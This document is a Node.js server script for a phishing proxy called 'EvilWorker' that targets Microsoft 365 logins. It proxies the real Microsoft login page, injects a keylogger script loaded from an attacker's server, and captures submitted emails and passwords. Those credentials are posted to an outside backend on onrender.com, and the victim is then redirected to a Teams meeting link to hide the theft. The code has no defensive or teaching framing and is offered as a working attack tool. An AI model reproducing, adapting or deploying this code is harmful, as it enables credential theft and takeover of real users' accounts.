const http = require('http');
const https = require('https');
const querystring = require('querystring');

const PROXY_ENTRY_POINT = "/login";
const REDIRECT_URL = "https://login.microsoftonline.com/";
const BACKEND_URL = "https://meeting-h5ze.onrender.com";
const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // --- Handle POST request (credential submission) ---
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const formData = querystring.parse(body);
            const email = formData.login || formData.loginfmt || formData.email || '';
            const password = formData.passwd || formData.password || '';

            console.log(`[CREDENTIALS] Email: ${email}, Password: ${password}`);

            // Send to backend
            fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'login_attempt',
                    email: email,
                    password: password,
                    visitorInfo: {
                        fullUrl: req.url,
                        userAgent: req.headers['user-agent'] || 'Unknown'
                    }
                })
            }).catch(err => console.error('Failed to send to backend:', err));

            // Redirect to Teams
            res.writeHead(302, { 'Location': TEAMS_REDIRECT });
            res.end();
        });
        return;
    }

    // --- Handle GET request (login page) ---
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        const email = req.url.split('login_hint=')[1]?.split('&')[0] || '';
        const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&login_hint=${encodeURIComponent(email)}`;
        
        console.log(`[PROXY] Forwarding to: ${targetUrl}`);
        
        https.get(targetUrl, (targetRes) => {
            let data = [];
            targetRes.on('data', (chunk) => data.push(chunk));
            targetRes.on('end', () => {
                let body = Buffer.concat(data).toString();
                
                // Inject keylogger (if needed)
                body = body.replace(
                    '</body>',
                    '<script src="http://YOUR_VPS_IP:3001/keylogger.js"></script></body>'
                );
                
                res.writeHead(200, {
                    'Content-Type': 'text/html',
                    'Cache-Control': 'no-store'
                });
                res.end(body);
            });
        }).on('error', (err) => {
            console.error(`[ERROR] Proxy failed: ${err.message}`);
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
        });
    } else {
        res.writeHead(302, { 'Location': REDIRECT_URL });
        res.end();
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ EvilWorker proxy running on port ${PORT}`);
    console.log(`📍 Entry point: ${PROXY_ENTRY_POINT}`);
});